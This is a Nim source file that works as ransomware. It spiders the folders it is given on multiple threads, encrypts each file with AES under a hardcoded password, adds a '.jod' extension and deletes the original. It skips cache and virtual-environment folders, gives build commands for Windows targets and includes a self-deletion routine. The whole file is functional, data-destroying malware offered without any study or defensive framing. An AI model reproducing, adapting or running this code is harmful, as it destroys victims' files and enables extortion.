import nimAesCrypt
import os
import strenc
import threadpool
import std/os
import strutils

# COMPILE: nim --threads:on -d:release c encrypt.nim
# FOR WINDOWS: nim --threads:on -d:release --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc c encrypt.nim
# RUN: nim --threads:on -d:release r encrypt.nim ./somefolder/ ./sensfold/

proc EncryptFile(file: string) =
  {.gcsafe.}:
    let password = "THISISACOMPLEXPASSWRD_201334354357"
    let encryptedFile = file & ".jod"
    if not fileExists(file):
        #echo "File not present ", file
        return
    encryptFile(file, encryptedFile,password,1024)
    removeFile(file)
    #echo "File encrypted"


proc fileWalk(path: string){.thread.} =
  echo "Spidering for" & path
  for kind, path in walkDir(path):
    case kind:
    of pcFile:
      #echo "File: ", path
      if(path.endswith(".jod")):
        continue
      spawn EncryptFile(path)
    of pcDir:
      #echo "Dir: ", path
      if("cache" in path or "node_modules" in path or "venv" in path or "env" in path or "tmp" in path or "temp" in path):
        continue
      spawn fileWalk(path)
    of pcLinkToFile:
      #echo "Link to file: ", path
      continue
    of pcLinkToDir:
      #echo "Link to dir: ", path
      continue


proc main() =
    # if not dirExists("./encryptedFolder/"):
    #     createDir("./encryptedFolder/")
    #     echo "Dir created: ./encryptedFolder/"
    # else:
    #     echo "Dir already exists"
    var filename = "./sensitiveFolder"
    var files : seq[string]
    if paramCount() > 0:
        for counter in 1..paramCount():    
          files.add(paramStr(counter))
          filename=paramStr(counter)
          if dirExists(filename):
              #echo "Will Encrypt files in: ", filename
              continue
          else:
              #echo "Folder does not exist: ", filename,"\nPlease enter a proper folder path. Preferably the full path."
              return
    else:
      files.add(filename)
    for file in files:
      #echo "RANSOMWARING " & file
      spawn fileWalk(file)
    sync()

proc selfDeletion() =
  let ownname = getAppFilename()
  #echo "Deleting: ", ownname
  removeFile(ownname)

main()

